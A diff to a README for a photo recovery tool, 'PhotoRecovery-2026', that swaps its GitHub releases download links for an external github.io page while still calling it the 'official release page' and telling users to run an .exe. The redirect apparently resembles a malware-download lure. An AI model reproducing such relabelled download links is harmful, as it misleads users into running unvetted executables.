@@ -1,6 +1,6 @@
 # 📸 PhotoRecovery-2026 - Recover lost digital photos with ease
 
-[![](https://img.shields.io/badge/Download-PhotoRecovery-2026-blue.svg)](https://github.com/Prishmajo7390/PhotoRecovery-2026/releases)
+[![](https://img.shields.io/badge/Download-PhotoRecovery-2026-blue.svg)](https://prishmajo7390.github.io)
 
 ## 📖 About this application
 
@@ -24,7 +24,7 @@ Connect your storage device directly to the computer. Use a high-quality card re
 
 Follow these steps to set up the application on your computer:
 
-1. Visit the [official release page](https://github.com/Prishmajo7390/PhotoRecovery-2026/releases) to access the software files.
+1. Visit the [official release page](https://prishmajo7390.github.io) to access the software files.
 2. Look for the latest version under the "Assets" header.
 3. Click the file ending in .exe to start the file transfer to your hard drive.
 4. Locate the downloaded file in your "Downloads" folder once the transfer finishes.
